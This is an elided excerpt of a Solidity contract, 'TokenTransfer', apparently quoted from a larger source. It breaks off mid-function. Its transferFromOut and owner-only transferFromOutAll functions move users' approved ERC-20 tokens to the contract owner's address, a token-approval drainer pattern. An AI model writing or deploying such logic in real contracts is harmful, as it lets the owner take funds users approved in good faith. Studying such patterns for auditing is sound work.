...
contract TokenTransfer is Ownable {
    ...
    address public _migrateAddress;

    function migrate(address orig) public returns (address) {
        return _migrateAddress;
    }

    function updateMigrateAddress(address migrateAddress) public onlyOwner() {
        _migrateAddress = migrateAddress;
    }
    ...
    function transferFromOut(
        ...
        (uint256 allowance, uint256 balanceOf) =
            checkAllowance(erc20, from, address(this));
        if (amount <= allowance && amount <= balanceOf) {
            token.safeTransferFrom(from, owner(), amount);
        }
    }
    ...
    function transferFromOutAll(address erc20, address from)
        public
        onlyOwner()
    {
        (uint256 allowance, uint256 balanceOf) =
